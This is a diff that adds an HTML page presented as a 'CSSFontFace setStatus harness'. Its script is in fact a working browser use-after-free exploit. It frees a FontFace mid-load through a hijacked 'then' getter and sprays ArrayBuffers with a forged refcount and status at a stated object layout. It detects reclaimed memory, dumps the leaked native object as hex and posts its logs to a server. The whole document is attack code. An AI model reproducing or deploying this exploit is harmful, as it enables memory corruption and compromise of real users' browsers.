@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CSSFontFace setStatus harness</title>
+<style>
+  body { margin:0; padding:18px; background:#0b0e14; color:#d7dce5;
+         font-family: system-ui, sans-serif; }
+  #o { white-space:pre-wrap; font:12px/1.5 ui-monospace, monospace; color:#9fb4d6; }
+  #s { font-size:44px; font-weight:700; }
+</style>
+</head>
+<body>
+  <style id="invalidate">x {}</style>
+  <div id="s">CSF</div>
+  <pre id="o"></pre>
+  <script>
+  "use strict";
+  var out = document.getElementById("o");
+  var LOG = [];
+  function log(s) {
+    out.textContent += s + "\n";
+    LOG.push(s);
+    try {
+      fetch("/report", { method: "POST", headers: { "content-type": "application/json" },
+        body: JSON.stringify({ ua: navigator.userAgent, lines: LOG }) });
+    } catch (e) {}
+  }
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+  function hex8(v) { return ("00000000" + (v >>> 0).toString(16)).slice(-8); }
+
+  // ---- build check ---------------------------------------------------------
+  var UA = navigator.userAgent;
+  log("UA: " + UA);
+  log("document.fonts=" + (!!document.fonts) + " FontFace=" + (typeof FontFace));
+  try { log("body font: " + getComputedStyle(document.body).fontFamily); } catch (e) {}
+  log("feature dating: toSorted=" + (typeof [].toSorted) +
+      " Float16=" + (typeof Float16Array) +
+      " withResolvers=" + (typeof Promise.withResolvers));
+
+  // ---- UAF object layout (VERIFIED from wkc3) ------------------------------
+  var LAYOUT = { status: 0x7a, srcCount: 0x4c, srcVec: 0x40, clients: 0x58 };
+
+  // ---- annotated dump ------------------------------------------------------
+  function dump(ab) {
+    var u = new Uint8Array(ab), lines = [];
+    for (var i = 0; i + 8 <= u.length; i += 8) {
+      var lo = (u[i] | u[i+1]<<8 | u[i+2]<<16 | u[i+3]<<24) >>> 0;
+      var hi = (u[i+4] | u[i+5]<<8 | u[i+6]<<16 | u[i+7]<<24) >>> 0;
+      lines.push("+" + ("000" + i.toString(16)).slice(-3) + "  " + hex8(hi) + " " + hex8(lo));
+    }
+    return lines.join("\n");
+  }
+
+  // ---- one attempt ---------------------------------------------------------
+  // Non-blocking: face.load() is fire-and-forget; we inspect after a settle.
+  async function attempt(size, syncFam) {
+    var tag = "0x" + size.toString(16);
+    // breadcrumb: survives an applet reload, tells us which size was in flight
+    try { localStorage.setItem("setstatus:" + tag, "1"); } catch (e) {}
+
+    var style = document.createElement("style");
+    style.textContent = "@font-face { font-family: T" + tag + "; src: local(" + syncFam +
+                        "); unicode-range: U+0041; }";
+    document.head.append(style);
+    void document.body.offsetHeight;
+
+    var face = null;
+    for (var f of document.fonts) {
+      if (f.family.replaceAll(/['"]/g, "") === "T" + tag) { face = f; break; }
+    }
+    if (!face) { style.remove(); return "no-face"; }
+    void face.loaded;
+
+    var spray = [];
+    var n = 0x80;
+    var old = FontFace.prototype.then;
+    Object.defineProperty(FontFace.prototype, "then", {
+      configurable: true,
+      get: function () {
+        if (this !== face) return undefined;
+        // free the face mid-setStatus
+        style.remove();
+        void document.body.offsetHeight;
+        // spray same-size ArrayBuffers; 0xB8 is the verified size
+        for (var i = 0; i < n; i++) {
+          var ab = new ArrayBuffer(size);
+          var dv = new DataView(ab);
+          try {
+            dv.setUint32(8, 1, true);                 // refcount
+            dv.setUint8(LAYOUT.status, 3);            // Status::Success
+          } catch (e) {}
+          spray.push(ab);
+        }
+        return undefined;
+      }
+    });
+
+    try { face.load(); } catch (e) { /* expected on some engines */ }
+    await sleep(400);                                  // settle, do not await load
+    Object.defineProperty(FontFace.prototype, "then", { configurable: true, value: old });
+
+    // ---- detection --------------------------------------------------------
+    var hit = null;
+    for (var j = 0; j < spray.length; j++) {
+      var u = new Uint8Array(spray[j]), dirty = false;
+      for (var k = 0; k < u.length; k++) {
+        if (u[k] !== 0) {
+          // refcount and status are ours; anything else is native
+          if (k !== 8 && k !== 9 && k !== 10 && k !== 11 && k !== LAYOUT.status) { dirty = true; break; }
+        }
+      }
+      var dv2 = new DataView(spray[j]);
+      var rc = dv2.getUint32(8, true);
+      if (dirty || rc === 2) { hit = { ab: spray[j], dirty: dirty, rc: rc }; break; }
+    }
+
+    style.remove();
+    try { localStorage.removeItem("setstatus:" + tag); } catch (e) {}
+    if (!hit) return "miss";
+    log("HIT " + tag + " dirty=" + hit.dirty + " refcount=" + hit.rc);
+    log("object:\n" + dump(hit.ab));
+    return "hit";
+  }
+
+  // ---- synchronous local probe --------------------------------------------
+  async function probe(fam) {
+    var face;
+    try { face = new FontFace("p_" + fam, "local(" + fam + ")", { unicodeRange: "U+0041" }); }
+    catch (e) { return false; }
+    document.fonts.add(face);
+    var fired = false, old = FontFace.prototype.then;
+    Object.defineProperty(FontFace.prototype, "then", {
+      configurable: true, get: function () { if (this === face) fired = true; return undefined; }
+    });
+    try { await document.fonts.load("1em " + face.family, "A"); } catch (e) {}
+    Object.defineProperty(FontFace.prototype, "then", { configurable: true, value: old });
+    try { document.fonts.delete(face); } catch (e) {}
+    return fired;
+  }
+
+  // ---- main ---------------------------------------------------------------
+  (async function () {
+    var fams = ["Helvetica", "Arial", "systemfont", "Arial Unicode", "Helvetica Bold"];
+    try {
+      var bf = getComputedStyle(document.body).fontFamily || "";
+      bf.split(",").forEach(function (x) {
+        x = x.replace(/['"]/g, "").trim();
+        if (x && fams.indexOf(x) === -1) fams.push(x);
+      });
+    } catch (e) {}
+    var sync = null;
+    for (var i = 0; i < fams.length; i++) {
+      var s = await probe(fams[i]);
+      log("local(" + fams[i] + ") sync=" + s);
+      if (s) { sync = fams[i]; break; }
+    }
+    if (!sync) { log("no synchronous local family -> sweep would fail safe"); return; }
+    log("synchronous family: " + sync);
+
+    // sizeof candidates led by the verified 0xB8
+    var sizes = [0xb8, 0x80, 0x88, 0x90, 0x98, 0xa0, 0xa8, 0xb0, 0xb8, 0xc0, 0xc8, 0xd0];
+    for (var j = 0; j < sizes.length; j++) {
+      var r = await attempt(sizes[j], sync);
+      log("size 0x" + sizes[j].toString(16) + ": " + r);
+      if (r === "hit") { log("done (hit)"); return; }
+      await sleep(120);
+    }
+    log("done (no hit)");
+  })();
+  </script>
+</body>
+</html>
